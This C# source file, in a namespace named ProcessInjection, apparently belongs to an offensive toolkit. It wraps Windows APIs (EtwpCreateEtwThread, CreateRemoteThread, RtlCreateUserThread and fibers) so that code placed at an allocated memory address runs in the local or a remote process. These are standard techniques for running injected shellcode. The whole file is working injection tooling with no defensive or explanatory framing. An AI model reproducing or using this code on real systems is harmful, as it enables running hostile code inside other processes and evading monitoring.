using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ProcessInjection
{
    class exec
    {
        public static int error = Marshal.GetLastWin32Error();

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
        static extern IntPtr EtwpCreateEtwThread(IntPtr lpStartAddress, IntPtr lpParameter);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("ntdll.dll")]
        public static extern int RtlCreateUserThread(IntPtr processHandle, IntPtr securityDescriptor, bool createSuspended, uint zeroBits, IntPtr zeroReserve, IntPtr zeroCommit, IntPtr startAddress, IntPtr startParameter, ref IntPtr threadHandle, ref ClientId clientid);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateFiber(uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter);

        [DllImport("kernel32.dll")]
        public static extern IntPtr ConvertThreadToFiber(IntPtr lpParameter);

        [DllImport("kernel32.dll")]
        public static extern IntPtr SwitchToFiber(IntPtr lpParameter);


        public static IntPtr CreateEtwMethod(IntPtr allocMemAddress)
        {
            Console.WriteLine("[+] Run with EtwpCreateEtwThread");
            return EtwpCreateEtwThread(allocMemAddress, IntPtr.Zero);
        }

        public static IntPtr RemoteThreadMethod(IntPtr prochandle, IntPtr allocMemAddress)
        {
            Console.WriteLine("[+] Run with CreateRemoteThread");
            uint Nthreadid = 0;
            IntPtr hthread = CreateRemoteThread(prochandle, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, out Nthreadid);
            Console.WriteLine("[+] Run with CreateRemoteThread :"+ hthread);
            error = Marshal.GetLastWin32Error();

            Console.WriteLine("The last Win32 Error was: " + error);
            return hthread;
        }

        public static int RtlCreateThreadMethod(IntPtr prochandle, IntPtr allocMemAddress)
        {
            Console.WriteLine("[+] Run with RtlCreateUserThread");
            IntPtr targetThread = IntPtr.Zero;
            ClientId id = new ClientId();
            int hthread = RtlCreateUserThread(prochandle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, allocMemAddress, IntPtr.Zero, ref targetThread, ref id);
            return hthread;
        }

        public static IntPtr FibersMethod(IntPtr allocMemAddress)
        {
            Console.WriteLine("[+] Run with CreateFiber");
            IntPtr fiberth = ConvertThreadToFiber(IntPtr.Zero);
            IntPtr fiber = CreateFiber((uint)IntPtr.Zero, allocMemAddress, IntPtr.Zero);
            IntPtr sw1 = SwitchToFiber(fiber);
            IntPtr sw2 = SwitchToFiber(fiberth);
            return IntPtr.Zero;
        }




    }
}
